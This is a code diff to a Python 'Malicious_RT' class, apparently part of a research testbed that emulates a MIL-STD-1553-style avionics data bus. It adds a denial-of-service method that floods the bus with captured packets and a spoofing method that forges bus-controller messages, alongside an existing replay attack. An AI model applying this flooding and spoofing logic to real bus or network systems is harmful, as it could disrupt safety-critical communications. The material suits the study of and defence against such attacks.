@@ -1,9 +1,18 @@
 import threading
 import time
 import socket
+import random
 
 
 class Malicious_RT:
+
+    # from Bus_Controller.BC_Simulator import Bus_Controller
+    # from Remote_Terminal.RT_Simulator import Remote_Terminal
+    from Bus_Controller.Message_Layer.ML_Encoder_BC \
+        import MessageLayerEncoderBC
+    # from Message_Layer.ML_Decoder_BC import MessageLayerDecoderBC
+    # from Physical_Layer_Emulation.Communication_Socket_BC import BC_Listener
+    # from Physical_Layer_Emulation.Communication_Socket_BC import BC_Sender
 
     cycle_list = list()
     captured_packets = list()
@@ -26,8 +35,8 @@ class Malicious_RT:
         check_flag = 0
         while True:
             time.sleep(10)
-            print("Performing Replay attack")
             if self.captured_packets:
+                print("Performing Replay attack")
                 # for i in self.captured_packets:
                 #    print("Sending ", i)
                 packet_check = self.captured_packets.pop(0)
@@ -43,6 +52,33 @@ class Malicious_RT:
                     if packet_check[:3] == '100':
                         self.captured_packets.insert(0, packet_check)
                     print("Replay of 1 cycle done")
+    
+    def dos_attack(self):
+        print("Performing DoS attack")
+        while True:
+            time.sleep(1)
+            for captured_packet in self.captured_packets:
+                self.send_packet(captured_packet)
+                # print(captured_packet)
+    
+    def spoofing_attack(self):
+        print("Performing Spoofing attack")
+        while True:
+            rt_address = "01"
+            sub_address_or_mode_code = "01"
+            data_word_count_list = ["01", "02", "03", "04", "05", "06", "07", 
+                                    "08", "09", "0A", "0B", "0C", "0D", "0E", 
+                                    "0F", "10", "11", "12", "13", "14", "15", 
+                                    "16", "17", "18", "19", "1A", "1B", "1C", 
+                                    "1D", "1E", "1F"]
+            data_word_count = random.choice(data_word_count_list)
+            frames = self.MessageLayerEncoderBC().receive_message_from_RT(
+                rt_address, sub_address_or_mode_code, data_word_count)
+            print(frames)
+            for frame in frames:
+                # print(frame)
+                self.send_packet(frame)
+            time.sleep(20)
 
     def show_packets(self):
         while True:
@@ -77,5 +113,14 @@ if __name__ == "__main__":
     replay_thread = threading.Thread(
         target=capture_agent.replay_attack
     )
+#    replay_thread.start()
 
-    replay_thread.start()
+    dos_thread = threading.Thread(
+        target=capture_agent.dos_attack
+    )
+#    dos_thread.start()
+
+    spoofing_thread = threading.Thread(
+        target=capture_agent.spoofing_attack
+    )
+#    spoofing_thread.start()
